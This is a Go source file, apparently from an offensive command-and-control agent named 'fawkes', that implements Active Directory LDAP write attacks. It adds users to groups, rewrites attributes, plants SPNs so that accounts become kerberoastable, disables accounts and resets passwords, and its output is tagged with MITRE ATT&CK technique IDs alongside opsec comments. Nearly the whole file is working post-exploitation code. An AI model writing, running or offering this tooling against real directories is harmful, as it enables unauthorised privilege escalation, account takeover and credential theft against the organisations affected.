package commands

import (
	"fmt"
	"strconv"
	"strings"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

func ldapAddMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Group == "" {
		return errorResult("Error: -target (user/computer to add) and -group (group name) are required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	groupDN, err := ldapResolveDN(conn, args.Group, baseDN)
	if err != nil {
		return errorf("Error resolving group: %v", err)
	}

	modReq := ldap.NewModifyRequest(groupDN, nil)
	modReq.Add("member", []string{targetDN})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error adding member: %v", err)
	}

	return successf("[*] LDAP Group Membership Modification (T1098)\n"+
		"[+] Added:  %s\n"+
		"[+] To:     %s\n"+
		"[+] Server: %s\n", targetDN, groupDN, args.Server)
}

func ldapRemoveMember(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Group == "" {
		return errorResult("Error: -target (user/computer to remove) and -group (group name) are required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	groupDN, err := ldapResolveDN(conn, args.Group, baseDN)
	if err != nil {
		return errorf("Error resolving group: %v", err)
	}

	modReq := ldap.NewModifyRequest(groupDN, nil)
	modReq.Delete("member", []string{targetDN})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error removing member: %v", err)
	}

	return successf("[*] LDAP Group Membership Modification (T1098)\n"+
		"[+] Removed: %s\n"+
		"[+] From:    %s\n"+
		"[+] Server:  %s\n", targetDN, groupDN, args.Server)
}

func ldapSetAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Attr == "" {
		return errorResult("Error: -target (object to modify) and -attr (attribute name) are required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	values := args.Values
	if len(values) == 0 && args.Value != "" {
		values = []string{args.Value}
	}
	modReq.Replace(args.Attr, values)

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error setting attribute: %v", err)
	}

	valDisplay := args.Value
	if len(args.Values) > 0 {
		valDisplay = strings.Join(args.Values, ", ")
	}

	return successf("[*] LDAP Attribute Modification (T1098)\n"+
		"[+] Target:    %s\n"+
		"[+] Attribute: %s\n"+
		"[+] Value:     %s\n"+
		"[+] Operation: REPLACE\n"+
		"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
}

func ldapAddAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Attr == "" {
		return errorResult("Error: -target (object to modify) and -attr (attribute name) are required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	values := args.Values
	if len(values) == 0 && args.Value != "" {
		values = []string{args.Value}
	}
	modReq.Add(args.Attr, values)

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error adding attribute value: %v", err)
	}

	valDisplay := args.Value
	if len(args.Values) > 0 {
		valDisplay = strings.Join(args.Values, ", ")
	}

	return successf("[*] LDAP Attribute Modification (T1098)\n"+
		"[+] Target:    %s\n"+
		"[+] Attribute: %s\n"+
		"[+] Value:     %s\n"+
		"[+] Operation: ADD\n"+
		"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
}

func ldapRemoveAttr(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Attr == "" {
		return errorResult("Error: -target (object to modify) and -attr (attribute name) are required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	values := args.Values
	if len(values) == 0 && args.Value != "" {
		values = []string{args.Value}
	}
	modReq.Delete(args.Attr, values)

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error removing attribute value: %v", err)
	}

	valDisplay := args.Value
	if len(args.Values) > 0 {
		valDisplay = strings.Join(args.Values, ", ")
	}
	if valDisplay == "" {
		valDisplay = "(all values)"
	}

	return successf("[*] LDAP Attribute Modification (T1098)\n"+
		"[+] Target:    %s\n"+
		"[+] Attribute: %s\n"+
		"[+] Value:     %s\n"+
		"[+] Operation: DELETE\n"+
		"[+] Server:    %s\n", targetDN, args.Attr, valDisplay, args.Server)
}

func ldapSetSPN(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Value == "" {
		return errorResult("Error: -target (account) and -value (SPN, e.g. MSSQLSvc/host.domain.local) are required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Add("servicePrincipalName", []string{args.Value})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error setting SPN: %v", err)
	}

	return successf("[*] LDAP SPN Modification (T1134)\n"+
		"[+] Target: %s\n"+
		"[+] SPN:    %s\n"+
		"[+] Server: %s\n"+
		"\n[!] Account is now kerberoastable — use kerberoast to extract TGS hash.\n",
		targetDN, args.Value, args.Server)
}

func ldapToggleAccount(conn *ldap.Conn, args ldapWriteArgs, baseDN string, disable bool) structs.CommandResult {
	if args.Target == "" {
		return errorResult("Error: -target (account to disable/enable) is required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	// Read current userAccountControl
	searchReq := ldap.NewSearchRequest(
		targetDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		1, 10, false,
		"(objectClass=*)",
		[]string{"userAccountControl"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil || len(result.Entries) == 0 {
		return errorf("Error reading userAccountControl: %v", err)
	}

	uacStr := result.Entries[0].GetAttributeValue("userAccountControl")
	uac, err := strconv.Atoi(uacStr)
	if err != nil {
		return errorf("Error parsing userAccountControl value %q: %v", uacStr, err)
	}

	const accountDisable = 0x0002
	var newUAC int
	var actionStr string

	if disable {
		newUAC = uac | accountDisable
		actionStr = "Disabled"
	} else {
		newUAC = uac &^ accountDisable
		actionStr = "Enabled"
	}

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("userAccountControl", []string{fmt.Sprintf("%d", newUAC)})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error modifying userAccountControl: %v", err)
	}

	return successf("[*] LDAP Account Control Modification (T1098)\n"+
		"[+] Target: %s\n"+
		"[+] Action: %s\n"+
		"[+] UAC:    0x%04X → 0x%04X\n"+
		"[+] Server: %s\n", targetDN, actionStr, uac, newUAC, args.Server)
}

func ldapSetPassword(conn *ldap.Conn, args ldapWriteArgs, baseDN string) structs.CommandResult {
	if args.Target == "" || args.Value == "" {
		return errorResult("Error: -target (account) and -value (new password) are required. Requires LDAPS.")
	}

	if !args.UseTLS {
		return errorResult("Error: set-password requires LDAPS (-use_tls true). AD rejects password changes over unencrypted LDAP.")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target: %v", err)
	}

	// AD password format: UTF-16LE encoded, surrounded by double quotes
	quotedPwd := "\"" + args.Value + "\""
	utf16Pwd := make([]byte, len(quotedPwd)*2)
	for i, c := range quotedPwd {
		utf16Pwd[i*2] = byte(c)
		utf16Pwd[i*2+1] = 0
	}
	defer structs.ZeroBytes(utf16Pwd) // opsec: zero UTF-16 password buffer

	modReq := ldap.NewModifyRequest(targetDN, nil)
	modReq.Replace("unicodePwd", []string{string(utf16Pwd)})

	if err := conn.Modify(modReq); err != nil {
		return errorf("Error setting password: %v", err)
	}

	return successf("[*] LDAP Password Change (T1098)\n"+
		"[+] Target:   %s\n"+
		"[+] Password: (set successfully)\n"+
		"[+] Server:   %s\n", targetDN, args.Server)
}
